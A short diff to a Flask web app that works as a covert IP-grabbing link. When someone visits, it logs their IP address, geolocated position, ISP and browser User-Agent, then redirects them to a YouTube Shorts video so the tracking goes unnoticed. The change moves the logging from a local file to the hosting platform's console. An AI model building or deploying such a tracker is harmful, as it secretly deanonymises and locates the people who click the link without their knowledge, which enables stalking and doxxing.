@@ -28,7 +28,7 @@ def get_location(ip):
 
 @app.route('/')
 def index():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
     info = get_location(ip)
 
@@ -39,11 +39,9 @@ def index():
         f"ISP: {info['isp']} | Device: {user_agent}"
     )
 
-    with open("logs.txt", "a") as file:
-        file.write(log_entry + "\n")
-
-    print(log_entry)
+    print(log_entry)  # <-- This goes to Render logs
     return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
+
